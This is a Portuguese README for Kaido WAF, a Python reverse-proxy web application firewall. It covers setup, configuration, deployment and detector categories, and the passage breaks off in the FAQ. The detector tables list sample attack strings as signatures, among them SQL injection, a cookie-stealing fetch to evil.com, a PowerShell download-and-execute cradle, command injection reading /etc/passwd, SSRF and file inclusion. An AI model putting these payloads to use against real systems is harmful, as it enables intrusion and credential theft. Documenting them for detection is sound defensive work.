<div align="center">
  <h1>⚔️ Kaido WAF</h1>
  <p><strong>Web Application Firewall do Kaido Red Team</strong></p>
  <p>
    <a href="#-sobre">Sobre</a> •
    <a href="#-arquitetura">Arquitetura</a> •
    <a href="#-features">Features</a> •
    <a href="#-instalação">Instalação</a> •
    <a href="#-configuração">Configuração</a> •
    <a href="#-modos-de-operação">Modos</a> •
    <a href="#-detectores">Detectores</a> •
    <a href="#-estrutura-do-projeto">Estrutura</a> •
    <a href="#-dashboard">Dashboard</a> •
    <a href="#-api">API</a> •
    <a href="#-deploy">Deploy</a> •
    <a href="#-exemplos">Exemplos</a> •
    <a href="#-segurança">Segurança</a> •
    <a href="#-perguntas-frequentes">FAQ</a> •
    <a href="#-créditos">Créditos</a>
  </p>
  <p>
    <img src="https://img.shields.io/badge/version-2.1.0-ff4400" alt="Version">
    <img src="https://img.shields.io/badge/python-3.11%2B-ff8800" alt="Python">
    <img src="https://img.shields.io/badge/license-MIT-ff4400" alt="License">
    <img src="https://img.shields.io/badge/kaido-red_team-ff0000" alt="Kaido Red Team">
    <img src="https://img.shields.io/badge/status-production-00ff88" alt="Status">
  </p>
</div>

---

## 🔥 Sobre

**Kaido WAF** é um Web Application Firewall de alto desempenho desenvolvido pelo **Kaido Red Team**, projetado para proteger aplicações web contra os ataques mais comuns e avançados do cenário atual.

Opera como um **proxy reverso assíncrono** entre o cliente e o backend, inspecionando **cada requisição em tempo real** com um motor de detecção de alta performance que possui **mais de 150 padrões de ataque** em **10 categorias diferentes**.

> **👑 Criado por Gustavo — Red Team, Cyber Segurança Ofensivo e Programador Full Stack**
>
> *"Segurança não é produto, é processo. Kaido WAF é a materialização desse processo."*

### 🚨 AVISO DE SEGURANÇA — ANTES DE USAR EM PRODUÇÃO

```yaml
# 🔴 MUDA ISSO ANTES DE POR EM PRODUÇÃO!
dashboard:
  password: "CHANGE_ME_IN_PRODUCTION"    # ← TROQUE ISSO
  session_secret: "CHANGE_ME_IN_PRODUCTION"  # ← TROQUE ISSO
```

**Por que isso importa?**
- A senha default do dashboard é pública (está neste README)
- O `session_secret` default permite forjar sessões de admin
- O Redis não tem senha por padrão (use `REDIS_PASSWORD` no docker-compose)

**Checklist de segurança pré-produção:**
- [ ] Alterar `dashboard.password`
- [ ] Alterar `dashboard.session_secret`
- [ ] Configurar `REDIS_PASSWORD` no Redis
- [ ] Revisar `ip_blocking.whitelist`
- [ ] Desabilitar dashboard em EXPOSIÇÃO PÚBLICA se não necessário
- [ ] Usar HTTPS (Nginx/Cloudflare na frente)
- [ ] Rodar com usuário não-root (Docker já faz isso)

### Por que Kaido WAF?

| Característica | Kaido WAF | ModSecurity | Cloudflare WAF |
|---------------|-----------|-------------|----------------|
| **Performance** | Assíncrono (aiohttp) | Síncrono (Nginx module) | CDN-based |
| **Detectores** | 150+ padrões em 10 categorias | CRS (regras customizáveis) | Gerenciado |
| **Dashboard** | SSR incluso (zero JS) | Nenhum | Painel Cloudflare |
| **Rate Limiting** | Sliding window + Redis | Limit req module | Sim |
| **IP Blocker** | Whitelist/Blacklist/Auto | Sim | Sim |
| **Docker** | Nativo | Suporte limitado | N/A |
| **Licença** | MIT (gratuito) | Apache 2.0 | Pago |
| **Custo** | **Zero** | Gratuito | $$ |

---

## 🏗️ Arquitetura

```
┌─────────────┐     ┌──────────────────────────────────────────────┐     ┌─────────────┐
│             │     │              KAIDO WAF                       │     │             │
│   Cliente   │────▶│  ┌─────────┐  ┌──────────┐  ┌───────────┐  │────▶│   Backend   │
│  (Browser/  │     │  │  Proxy  │──│Detection │──│  Rate     │  │     │  (Upstream) │
│   API)      │     │  │ Reverso │  │ Engine   │  │  Limiter  │  │     │             │
│             │     │  └─────────┘  └──────────┘  └───────────┘  │     └─────────────┘
└─────────────┘     │       │              │              │       │
                    │       ▼              ▼              ▼       │
                    │  ┌─────────┐  ┌──────────┐  ┌───────────┐  │
                    │  │   IP    │  │   Log    │  │Dashboard  │  │
                    │  │ Blocker │  │ Sistema  │  │   SSR     │  │
                    │  └─────────┘  └──────────┘  └───────────┘  │
                    └──────────────────────────────────────────────┘
                                      │
                    ┌─────────────────┼─────────────────┐
                    ▼                 ▼                 ▼
              ┌──────────┐     ┌──────────┐     ┌──────────┐
              │    PG    │     │   Redis  │     │ Discord  │
              │ (Memory) │     │  (Cache) │     │ (Webhook)│
              └──────────┘     └──────────┘     └──────────┘
```

### Fluxo de uma requisição:

```
1. Cliente envia requisição → WAF (porta 8080)
2. IP Blocker → Verifica whitelist/blacklist/auto-block
3. Rate Limiter → Verifica sliding window (memória ou Redis)
4. Detection Engine → 10 detectores em paralelo no path, query, body, headers, cookies
5. Ataque detectado?
   ├── SIM → Modo BLOCK: HTTP 403 + JSON + headers
   │         Modo DETECT: loga + encaminha
   │         Modo LOG: loga tudo + encaminha
   └── NÃO  → Proxy reverso encaminha para upstream
6. Upstream responde → WAF faz streaming da resposta ao cliente
```

---

## 🚀 Features

### 🔒 Segurança

| Feature | Detalhes |
|---------|----------|
| **10 Detectores** | SQLi, XSS, Path Traversal, CMDi, SSRF, LFI/RFI, NoSQL, Cookie Poisoning, Open Redirect, Scanner Detection |
| **150+ Padrões** | Assinaturas de ataques reais, compiladas em regex otimizados |
| **3 Modos** | Block (bloqueia), Detect (apenas alerta), Log (auditoria total) |
| **Rate Limiting** | Sliding window por IP, burst control, timeout progressivo |
| **IP Blocker** | Whitelist, blacklist CIDR, auto-bloqueio por ofensas (peso por severidade) |
| **Bloco Customizável** | Status code, mensagem, headers, resposta em JSON |

### ⚡ Performance

| Feature | Detalhes |
|---------|----------|
| **Proxy Assíncrono** | aiohttp — centenas de requisições simultâneas sem bloquear |
| **Streaming** | Chunked transfer encoding para respostas grandes |
| **Buffer Configurável** | Tamanho do buffer de streaming ajustável |
| **Timeout Ajustável** | Timeout por requisição, limite de body size |
| **Redis Backend** | Rate limiting distribuído para múltiplas instâncias |

### 📊 Gerenciamento

| Feature | Detalhes |
|---------|----------|
| **Dashboard SSR** | Server-side renderizado com Jinja2 — zero JavaScript |
| **Login Protegido** | Autenticação por sessão com cookie HttpOnly |
| **JSON Logging** | Logs estruturados em JSON, rotação automática |
| **Discord Webhook** | Alertas de segurança no Discord (WARNING+) |
| **Health Check** | Endpoint `/__health` para monitoramento |
| **Estatísticas** | Endpoint `/__stats` com métricas do WAF |

### 🐳 Deploy

| Feature | Detalhes |
|---------|----------|
| **Docker Nativo** | Dockerfile otimizado (Python 3.13-slim) |
| **Docker Compose** | WAF + Redis + Backend em 3 serviços |
| **Non-Root** | Executa como usuário `kaido` (non-root) |
| **Healthcheck** | Docker healthcheck integrado |
| **Rolling Logs** | Rotação de logs com backup |

---

## 📦 Instalação

### Pré-requisitos

- Python 3.11+
- pip
- Redis (opcional, para rate limiting distribuído)

### Via pip (local)

```bash
# Clone
git clone https://github.com/zlostc/kaido-waf.git
cd kaido-waf

# Instale dependências
pip install -r requirements.txt

# Configure (opcional — edite config.yaml)
# vim config.yaml

# Execute
python3 -m kaido_waf.main

# Ou via Makefile
make run
```

### Via Docker

```bash
# Build
docker build -t kaido-waf .

# Run
docker run -d \
  --name kaido-waf \
  -p 8080:8080 \
  -p 9090:9090 \
  -v $(pwd)/config.yaml:/etc/kaido-waf/config.yaml \
  -v kaido_logs:/var/log/kaido-waf \
  kaido-waf
```

### Via Docker Compose (recomendado)

```bash
docker-compose -f examples/docker-compose.yml up -d
```

Isso sobe:
- `kaido-waf` — WAF na porta 8080, dashboard na 9090
- `redis` — Cache para rate limiting
- `backend` — Nginx de exemplo na porta 3000

### Via Makefile

```bash
make install    # Instala dependências
make run        # Executa o WAF
make docker-build    # Build Docker
make docker-run      # Run Docker
make docker-compose-up   # Docker Compose
make docker-compose-down # Parar Docker Compose
make clean       # Limpar cache
```

---

## ⚙️ Configuração

A configuração é feita via YAML. Por padrão, o WAF busca `config.yaml` no diretório raiz, ou você pode especificar via variável de ambiente `KAIDO_WAF_CONFIG`.

### Configuração completa:

```yaml
# ⚔️ Kaido WAF — Configuration
# Web Application Firewall do Kaido Red Team
# Criado por Gustavo — Kaido Team

server:
  host: "0.0.0.0"            # Interface de rede
  port: 8080                  # Porta do WAF
  workers: 4                  # Workers (reservado)
  upstream: "http://127.0.0.1:3000"  # Backend a proteger
  timeout: 30                 # Timeout em segundos
  buffer_size: 8192           # Tamanho do buffer de streaming (bytes)
  max_body_size: 10485760     # Tamanho máximo do body (10MB)

waf:
  enabled: true               # Liga/desliga o WAF
  mode: "block"               # block | detect | log
  block_status_code: 403      # HTTP status code de bloqueio
  block_message: "Blocked by Kaido WAF — Attack detected"

detection:
  sql_injection: true         # SQL Injection
  xss: true                   # Cross-Site Scripting
  path_traversal: true        # Path Traversal
  command_injection: true     # Command Injection
  ssrf: true                  # Server-Side Request Forgery
  lfi_rfi: true               # Local/Remote File Inclusion
  nosql_injection: true       # NoSQL Injection
  cookie_poisoning: true      # Cookie Poisoning
  open_redirect: true         # Open Redirect
  scanner_detection: true     # Scanner/Ferramentas de ataque

rate_limiting:
  enabled: true               # Liga/desliga rate limiting
  backend: "memory"           # memory | redis
  redis_url: "redis://localhost:6379/0"
  requests_per_minute: 60     # Máx requisições por minuto por IP
  burst_size: 100             # Máx requisições em 1 segundo
  block_duration: 300         # Tempo de bloqueio após exceder (segundos)

ip_blocking:
  enabled: true               # Liga/desliga IP blocker
  whitelist:                  # IPs sempre permitidos
    - "127.0.0.1"
    - "::1"
  blacklist: []               # IPs sempre bloqueados
  auto_block_threshold: 10    # Ofensas antes de auto-bloquear
  auto_block_duration: 3600   # Duração do auto-bloqueio (segundos, 1h)

logging:
  level: "INFO"               # DEBUG | INFO | WARNING | ERROR | CRITICAL
  format: "json"              # json | text
  file: "/var/log/kaido-waf/access.log"
  discord_webhook: ""         # URL do webhook do Discord

dashboard:
  enabled: true               # Liga/desliga dashboard
  port: 9090                  # Porta do dashboard
  auth_enabled: true          # Exige login
  username: "admin"           # Usuário do dashboard
  password: "CHANGE_ME_IN_PRODUCTION"   # 🔴 MUDE ANTES DE USAR EM PRODUÇÃO!
  session_secret: "CHANGE_ME_IN_PRODUCTION"  # 🔴 MUDE ANTES DE USAR EM PRODUÇÃO!
```

### Variáveis de ambiente:

| Variável | Descrição | Padrão |
|----------|-----------|--------|
| `KAIDO_WAF_CONFIG` | Caminho do arquivo de configuração | `./config.yaml` |

---

## 🎯 Modos de Operação

| Modo | Descrição | Uso |
|------|-----------|-----|
| **block** 🛡️ | Bloqueia requisições maliciosas com HTTP 403 | Produção |
| **detect** 👁️ | Apenas detecta e loga ataques, não bloqueia | Staging/Teste |
| **log** 📝 | Loga TUDO (inclusive requisições legítimas) | Auditoria/Debug |

**Exemplo de troca de modo em produção:**

```yaml
waf:
  mode: "block"  # Mude para "detect" se quiser apenas monitorar
```

---

## 🧠 Detectores

O motor de detecção possui **10 categorias** com **mais de 150 padrões** compilados em expressões regulares otimizadas. Cada detector pode ser ligado/desligado individualmente no `config.yaml`.

### 1. SQL Injection (`sql_injection`) 🔠

**20+ padrões** — detecta as principais técnicas de injeção SQL:

| Padrão | Severidade | Exemplo |
|--------|-----------|---------|
| `UNION SELECT` | high | `' UNION SELECT * FROM users--` |
| `DROP TABLE` | critical | `'; DROP TABLE users--` |
| `EXEC xp_` | critical | `'; EXEC xp_cmdshell('dir')--` |
| `WAITFOR DELAY` | critical | `'; WAITFOR DELAY '0:0:5'--` |
| `BENCHMARK()` | critical | `' OR BENCHMARK(5000000,MD5('x'))--` |
| `OR 1=1` | high | `' OR '1'='1'--` |
| `AND 1=1` | high | `' AND '1'='1'--` |
| `pg_sleep()` | critical | `'; SELECT pg_sleep(5)--` |
| `information_schema` | medium | `' UNION SELECT * FROM information_schema.tables--` |
| `@@version` | medium | `' UNION SELECT @@version--` |
| `LOAD_FILE()` | critical | `' UNION SELECT LOAD_FILE('/etc/passwd')--` |
| `INTO OUTFILE` | critical | `' INTO OUTFILE '/tmp/shell.php'--` |
| `0xHEX` | medium | `0x7573657273` |
| `SLEEP()` | medium | `' OR SLEEP(5)#` |
| `DECLARE @` | medium | `; DECLARE @a VARCHAR(100)--` |

### 2. XSS — Cross-Site Scripting (`xss`) 🎯

**30+ padrões** — detecta XSS refletido, armazenado e DOM-based:

| Padrão | Severidade | Exemplo |
|--------|-----------|---------|
| `<script>` tags | critical | `<script>alert(1)</script>` |
| `onload=` | high | `<body onload=alert(1)>` |
| `onerror=` | high | `<img src=x onerror=alert(1)>` |
| `onclick=` | high | `<div onclick=alert(1)>` |
| `onmouseover=` | high | `<img onmouseover=alert(1)>` |
| `onfocus=` | high | `<input onfocus=alert(1)>` |
| `onchange=` | medium | `<select onchange=alert(1)>` |
| `onsubmit=` | medium | `<form onsubmit=alert(1)>` |
| `onkeypress=` | medium | `<input onkeypress=alert(1)>` |
| `javascript:` | high | `<a href=javascript:alert(1)>` |
| `alert()` | high | `?q=<script>alert(1)</script>` |
| `confirm()` | high | `?q=<script>confirm(1)</script>` |
| `prompt()` | high | `?q=<script>prompt(1)</script>` |
| `document.cookie` | high | `?q=<script>document.cookie</script>` |
| `eval()` | critical | `?q=<script>eval('x')</script>` |
| `fromCharCode` | high | `String.fromCharCode(97,108,101,114,116)` |
| `data:text/html` | critical | `data:text/html;base64,...` |
| `<svg onload>` | critical | `<svg onload=alert(1)>` |
| `fetch()` | medium | `fetch('https://evil.com/steal?c='+document.cookie)` |

### 3. Path Traversal (`path_traversal`) 📂

**10+ padrões** — detecta tentativas de navegação em diretórios:

| Padrão | Severidade | Exemplo |
|--------|-----------|---------|
| `../../../` | high | `../../../etc/passwd` |
| `..%2f` | high | `..%2f..%2f..%2fetc/passwd` |
| `..%5c` | high | `..%5c..%5c..%5cwindows\system32` |
| `%2e%2e%2f` | high | `%2e%2e%2f%2e%2e%2fetc/passwd` |
| `..%252f` | medium | `..%252f..%252f..%252fetc/passwd` (double encoding) |

### 4. Command Injection (`command_injection`) 💻

**18+ padrões** — detecta injeção de comandos no servidor:

| Padrão | Severidade | Exemplo |
|--------|-----------|---------|
| `; id` | critical | `; id` |
| `| whoami` | critical | `| whoami` |
| `` `ls` `` | critical | `` `ls` `` |
| `$(cat /etc/passwd)` | critical | `$(cat /etc/passwd)` |
| `&& whoami` | critical | `&& whoami` |
| `system()` | high | `system('id')` |
| `exec()` | high | `exec('whoami')` |
| `shell_exec()` | high | `shell_exec('ls')` |
| `passthru()` | high | `passthru('id')` |
| `eval()` | critical | `eval('phpinfo()')` |
| Base64 decode | medium | `base64_decode('aWQ=')` |
| PowerShell -EncodedCommand | critical | `powershell -EncodedCommand SQBkAA==` |
| Invoke-Expression | critical | `iex(New-Object Net.WebClient).DownloadString(...)` |

### 5. SSRF — Server-Side Request Forgery (`ssrf`) 🌐

**14+ padrões** — detecta tentativas de acessar recursos internos:

| Padrão | Severidade | Exemplo |
|--------|-----------|---------|
| `169.254.169.254` | critical | Metadata cloud AWS/GCP/Azure |
| `127.0.0.1` | medium | `http://127.0.0.1:8080/admin` |
| `localhost` | medium | `http://localhost:9200` |
| `10.x.x.x` | medium | `http://10.0.0.1:6379` |
| `172.16-31.x.x` | medium | `http://172.16.0.1:5432` |
| `192.168.x.x` | medium | `http://192.168.1.1:80` |
| `file://` | high | `file:///etc/passwd` |
| `gopher://` | high | `gopher://localhost:6379/_*2%0d%0a...` |
| `dict://` | medium | `dict://localhost:6379/info` |

### 6. LFI/RFI — Local/Remote File Inclusion (`lfi_rfi`) 📄

**12+ padrões** — detecta inclusão de arquivos locais e remotos:

| Padrão | Severidade | Exemplo |
|--------|-----------|---------|
| `/etc/passwd` | critical | `?file=/etc/passwd` |
| `/etc/shadow` | critical | `?file=/etc/shadow` |
| `/proc/self/environ` | critical | `?file=/proc/self/environ` |
| `php://filter` | critical | `?file=php://filter/convert.base64-encode/resource=index.php` |
| `php://input` | high | `?file=php://input` (com POST) |
| `data://text/plain;base64` | critical | `?file=data://text/plain;base64,...` |
| `expect://` | high | `?file=expect://id` |

### 7. NoSQL Injection (`nosql_injection`) 🍃

**8+ padrões** — detecta injeção em bancos NoSQL (MongoDB):

| Padrão | Severidade | Exemplo |
|--------|-----------|---------|
| `$gt` | critical | `{"$gt": ""}` |
| `$ne` | critical | `{"$ne": ""}` |
| `$regex` | critical | `{"$regex": ".*"}` |
| `$where` | critical | `{"$where": "sleep(5000)"}` |
| `'||'1'=='1` | high | `username=admin'||'1'=='1` |

### 8. Cookie Poisoning (`cookie_poisoning`) 🍪

**7+ padrões** — detecta manipulação maliciosa de cookies:

| Padrão | Severidade | Exemplo |
|--------|-----------|---------|
| `admin=true` | high | Cookie: `admin=true` |
| `is_admin=1` | high | Cookie: `is_admin=1` |
| `debug=true` | medium | Cookie: `debug=true` |
| `role=admin` | high | Cookie: `role=admin` |

### 9. Open Redirect (`open_redirect`) 🔀

**7+ padrões** — detecta redirecionamentos abertos:

| Padrão | Severidade | Exemplo |
|--------|-----------|---------|
| `next=http://` | medium | `?next=http://evil.com` |
| `redirect=http://` | medium | `?redirect=http://evil.com` |
| `url=http://` | medium | `?url=http://evil.com` |
| `//evil.com@` | high | `//evil.com@real.com` |
| Domínios maliciosos | medium | `.ru`, `.cn`, `.tk`, `.ml`, `.ga`, `.cf` |

### 10. Scanner Detection (`scanner_detection`) 🔍

**18+ padrões** — detecta ferramentas de segurança/ataque:

| Ferramenta | Severidade | User-Agent/Característica |
|------------|-----------|--------------------------|
| SQLMap | medium | `sqlmap` |
| Nmap | low | `nmap` |
| Nikto | low | `nikto` |
| Gobuster | low | `gobuster` |
| Dirb | low | `dirb` |
| Wfuzz | low | `wfuzz` |
| BurpSuite | low | `burpsuite` |
| Acunetix | medium | `acunetix` |
| Nessus | medium | `nessus` |
| OpenVAS | medium | `openvas` |
| Metasploit | medium | `metasploit` |
| Curl | low | `curl` |
| Wget | low | `wget` |
| Python-requests | low | `python-requests` |
| Go-http-client | low | `go-http-client` |

---

## 📁 Estrutura do Projeto

```
kaido-waf/
├── README.md                    # Documentação principal
├── LICENSE                      # MIT License
├── setup.py                     # Pacote Python
├── requirements.txt             # Dependências
├── Makefile                     # Comandos utilitários
├── Dockerfile                   # Imagem Docker
├── config.yaml                  # Configuração principal
│
├── kaido_waf/                   # Pacote principal
│   ├── __init__.py              # Versão e exportações
│   │
│   ├── main.py                  # Servidor principal (KaidoWAF class)
│   │   ├── KaidoWAF.start()     # Inicia WAF + Dashboard
│   │   ├── KaidoWAF.stop()      # Para tudo gracefulmente
│   │   ├── _handle_request()    # Handler principal (IP Block → Rate Limit → Detection → Proxy)
│   │   ├── _block_response()    # Gera resposta de bloqueio
│   │   └── health/stats endpoints
│   │
│   ├── config/
│   │   ├── __init__.py
│   │   └── settings.py          # Config (carga YAML, defaults, propriedades)
│   │       ├── Config._load()           # Carrega YAML + merge defaults
│   │       ├── Config._defaults()       # Configuração padrão completa
│   │       ├── Config.waf_mode          # block | detect | log
│   │       ├── Config.enabled_detectors # Lista detectores ativos
│   │       └── +30 properties           # Acesso tipado a todas configs
│   │
│   ├── engine/                  # 🧠 Motor de detecção
│   │   ├── __init__.py
│   │   └── detector.py          # DetectionEngine + 150 padrões
│   │       ├── AttackType enum          # 10 tipos de ataque
│   │       ├── Finding dataclass        # Resultado de detecção
│   │       ├── DetectionEngine.__init__ # Compila todas as regex
│   │       ├── inspect_query()          # Inspeciona query string
│   │       ├── inspect_body()           # Inspeciona corpo POST
│   │       ├── inspect_path()           # Inspeciona caminho URL
│   │       ├── inspect_headers()        # Inspeciona cabeçalhos
│   │       ├── inspect_cookies()        # Inspeciona cookies
│   │       └── inspect_all()            # Inspeciona TUDO de uma vez
│   │
│   ├── proxy/                  # 🔄 Proxy reverso
│   │   ├── __init__.py
│   │   └── reverse_proxy.py    # ReverseProxy assíncrono
│   │       ├── ReverseProxy.start/stop         # Gerencia sessão aiohttp
│   │       ├── forward_request()               # Encaminha requisição ao upstream
│   │       ├── stream_response()               # Streaming chunked
│   │       └── build_response_headers()        # Remove hop-by-hop headers
│   │
│   ├── middleware/             # ⚡ Middleware
│   │   ├── __init__.py
│   │   ├── rate_limiter.py     # RateLimiter com sliding window
│   │   │   ├── MemoryBackend           # Em memória (asyncio.Lock)
│   │   │   ├── RedisBackend            # Redis (ZSET sliding window)
│   │   │   ├── RateLimiter.check()     # Verifica rate limit
│   │   │   ├── RateLimiter.block_ip()  # Bloqueia IP manualmente
│   │   │   └── RateLimiter.unblock_ip()
│   │   │
│   │   ├── ip_blocker.py       # IPBlocker com 3 níveis
│   │   │   ├── IPBlocker.check()            # Whitelist > Blacklist > Auto-block
│   │   │   ├── IPBlocker.report_offense()   # Registra ofensa com peso
│   │   │   └── IPBlocker.is_whitelisted()   # Verifica whitelist
│   │   │
│   │   └── request_parser.py  # Utilitários HTTP
│   │       ├── get_client_ip()      # Extrai IP real (X-Forwarded-For, CF, etc)
│   │       ├── normalize_path()     # Normaliza URL
│   │       └── decode_body()        # Decodifica body
│   │
│   ├── dashboard/              # 📊 Dashboard SSR
│   │   ├── __init__.py
│   │   ├── server.py           # DashboardServer (aiohttp + Jinja2)
│   │   │   ├── _check_auth()        # Autenticação por sessão
│   │   │   ├── _render()            # Renderiza templates Jinja2
│   │   │   ├── _login_page()        # Página de login
│   │   │   ├── _dashboard_page()    # Dashboard principal
│   │   │   └── _api_stats()         # API de estatísticas
│   │   │
│   │   └── templates/          # Templates Jinja2 (zero JS)
│   │       ├── login.html           # Tela de login estilizada
│   │       └── dashboard.html       # Dashboard completo
│   │
│   └── utils/                 # 🔧 Utilitários
│       ├── __init__.py
│       └── logger.py           # Sistema de logging
│           ├── JSONFormatter        # Formatação JSON estruturada
│           ├── DiscordWebhookHandler # Webhook Discord para alertas
│           └── setup_logger()       # Configura logging completo
│
└── examples/
    └── docker-compose.yml      # Exemplo Docker Compose
```

---

## 📊 Dashboard

O Kaido WAF inclui um **dashboard SSR (server-side rendered)** que **não depende de JavaScript** para funcionar — perfeito para ambientes restritos ou com segurança elevada.

### Acessando

```
http://seu-servidor:9090/dashboard
```

### Funcionalidades

- **Login protegido** — autenticação por sessão com cookie HttpOnly
- **Status do WAF** — online/offline, modo atual, versão
- **Detectores Ativos** — lista visual dos 10 detectores
- **Configuração** — upstream, rate limit, modo
- **Zero JavaScript** — 100% renderizado no servidor com Jinja2
- **Design responsivo** — funciona em mobile também

### Configuração do dashboard

```yaml
dashboard:
  enabled: true
  port: 9090
  auth_enabled: true
  username: "admin"
  password: "CHANGE_ME_IN_PRODUCTION"   # 🔴 MUDE ANTES DE USAR EM PRODUÇÃO!
  session_secret: "CHANGE_ME_IN_PRODUCTION"  # 🔴 MUDE ANTES DE USAR EM PRODUÇÃO!
```

---

## 📡 API

### Endpoints do WAF (porta 8080)

| Método | Endpoint | Descrição |
|--------|----------|-----------|
| `*` | `/{path}` | Proxy reverso (qualquer requisição) |
| `GET` | `/__health` | Health check |
| `GET` | `/__stats` | Estatísticas do WAF |

### Health Check

```bash
curl http://localhost:8080/__health
```

Resposta:
```json
{
  "status": "ok",
  "version": "2.1.0",
  "uptime": "TODO",
  "mode": "block",
  "detectors": ["sql_injection", "xss", "path_traversal", "command_injection", "ssrf", "lfi_rfi", "nosql_injection", "cookie_poisoning", "open_redirect", "scanner_detection"]
}
```

### Estatísticas

```bash
curl http://localhost:8080/__stats
```

Resposta:
```json
{
  "version": "2.1.0",
  "waf_mode": "block",
  "upstream": "http://127.0.0.1:3000",
  "detectors": ["sql_injection", "xss", ...],
  "rate_limiting": {
    "enabled": true,
    "rpm": 60
  }
}
```

### Endpoints do Dashboard (porta 9090)

| Método | Endpoint | Descrição |
|--------|----------|-----------|
| `GET` | `/` | Redireciona para `/dashboard` |
| `GET` | `/login` | Página de login |
| `POST` | `/login` | Autenticação |
| `GET` | `/dashboard` | Dashboard principal |
| `GET` | `/api/dashboard/stats` | API de estatísticas |

### Resposta de Bloqueio

Quando uma requisição é bloqueada, o WAF retorna:

```json
HTTP 403 Blocked by Kaido WAF
X-Kaido-WAF: blocked
X-Kaido-Block-Reason: Attack detected: sql_injection

{
  "error": "blocked_by_kaido_waf",
  "message": "Blocked by Kaido WAF — Attack detected",
  "reason": "Attack detected: sql_injection",
  "client_ip": "192.168.1.100",
  "findings": [
    {
      "attack_type": "sql_injection",
      "severity": "critical",
      "matched": "UNION SELECT * FROM",
      "location": "query",
      "value": "id=1 UNION SELECT * FROM users--",
      "timestamp": 1712345678.123
    }
  ]
}
```

### Rate Limit Excedido

```json
HTTP 429 Too Many Requests
Retry-After: 45

{
  "error": "rate_limit_exceeded",
  "retry_after": 45
}
```

---

## 🐳 Deploy

### Produção com Docker Compose + Redis + Nginx

```yaml
# docker-compose.yml
version: "3.8"

services:
  kaido-waf:
    build: .
    container_name: kaido-waf
    restart: unless-stopped
    ports:
      - "8080:8080"      # WAF proxy
      - "9090:9090"      # Dashboard
    environment:
      - KAIDO_WAF_CONFIG=/etc/kaido-waf/config.yaml
    volumes:
      - ./config.prod.yaml:/etc/kaido-waf/config.yaml
      - kaido_logs:/var/log/kaido-waf
    depends_on:
      - redis
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"

  redis:
    image: redis:7-alpine
    container_name: kaido-redis
    restart: unless-stopped
    ports:
      - "127.0.0.1:6379:6379"  # Apenas localhost
    volumes:
      - redis_data:/data
    command: redis-server --appendonly yes --requirepass ${REDIS_PASSWORD}
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"

volumes:
  redis_data:
  kaido_logs:
```

### Nginx como proxy reverso (recomendado)

```nginx
# /etc/nginx/sites-available/meu-site
upstream kaido_waf {
    server 127.0.0.1:8080;
    keepalive 64;
}

server {
    listen 443 ssl http2;
    server_name meu-site.com;

    ssl_certificate /etc/letsencrypt/live/meu-site.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/meu-site.com/privkey.pem;

    # Logs
    access_log /var/log/nginx/meu-site-access.log;
    error_log /var/log/nginx/meu-site-error.log;

    # Segurança
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;

    location / {
        proxy_pass http://kaido_waf;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_read_timeout 60s;
    }

    location /dashboard {
        proxy_pass http://127.0.0.1:9090;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    # Health check interno (não exposto externamente)
    location /__health {
        access_log off;
        proxy_pass http://127.0.0.1:8080/__health;
    }
}
```

### Systemd Service

```ini
# /etc/systemd/system/kaido-waf.service
[Unit]
Description=Kaido WAF — Web Application Firewall
After=network.target postgresql.service redis-server.service
Wants=postgresql.service redis-server.service

[Service]
Type=simple
User=kaido
Group=kaido
WorkingDirectory=/opt/kaido-waf
Environment=KAIDO_WAF_CONFIG=/etc/kaido-waf/config.yaml
ExecStart=/usr/bin/python3 -m kaido_waf.main
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

# Security hardening
NoNewPrivileges=true
ProtectSystem=full
ProtectHome=true
PrivateTmp=true
MemoryMax=512M

[Install]
WantedBy=multi-user.target
```

---

## 💡 Exemplos

### Exemplo 1: Bloqueio de SQL Injection

```bash
# Requisição normal — passa
curl -v "http://localhost:8080/produtos?id=1"

# Requisição maliciosa — bloqueada
curl -v "http://localhost:8080/produtos?id=1' UNION SELECT * FROM users--"
```

Resposta:
```
< HTTP/1.1 403 Blocked by Kaido WAF
< X-Kaido-WAF: blocked
< X-Kaido-Block-Reason: Attack detected: sql_injection
```

### Exemplo 2: Rate Limiting

```bash
# 60 requisições em 1 minuto passam
for i in $(seq 1 60); do
  curl -s -o /dev/null -w "%{http_code} " "http://localhost:8080/api"
done
# 61ª — bloqueada
curl -s -o /dev/null -w "%{http_code}" "http://localhost:8080/api"
# Resultado: 429
```

### Exemplo 3: Modo Detect (apenas logar)

```yaml
waf:
  mode: "detect"  # Não bloqueia, apenas loga
```

```bash
curl "http://localhost:8080/search?q=<script>alert(1)</script>"
# Requisição passa, mas é logada como ataque XSS
```

### Exemplo 4: IP Blocker com Auto-Bloqueio

```yaml
ip_blocking:
  auto_block_threshold: 5   # Após 5 ofensas
  auto_block_duration: 3600  # Bloqueia por 1 hora
```

Após 5 ataques detectados do mesmo IP, ele é automaticamente bloqueado por 1 hora.

### Exemplo 5: Customizando a resposta de bloqueio

```yaml
waf:
  block_status_code: 403
  block_message: "Acesso negado pelo Kaido WAF — Entre em contato com o administrador"
```

---

## 🔒 Segurança do Próprio WAF

O Kaido WAF foi projetado com segurança em mente desde a arquitetura:

### Docker
- Executa como **non-root user** (`kaido`)
- Imagem base **Python 3.13-slim** (superfície de ataque mínima)
- **Healthcheck** integrado

### Sistema
- **NoNewPrivileges** — não escala privilégios
- **ProtectSystem=full** — sistema de arquivos read-only
- **PrivateTmp** — /tmp isolado
- **MemoryMax** — limite de memória configurável

### Código
- **Input validation** em todos os pontos de entrada
- **Sem eval/exec** — zero execução de código dinâmico
- **Dependências mínimas** — apenas 4 pacotes Python
- **Async seguro** — sem race conditions (asyncio.Lock)

### Rede
- **Portas explícitas** — apenas 8080 e 9090
- **Redis bind localhost** — não exposto externamente
- **Headers de segurança** — X-Kaido-WAF em toda resposta

---

## ❓ Perguntas Frequentes

### O Kaido WAF funciona com HTTPS?

Sim! Coloque um Nginx ou Cloudflare na frente do WAF para fazer SSL termination. O WAF internamente pode rodar em HTTP.

### Qual o impacto na performance?

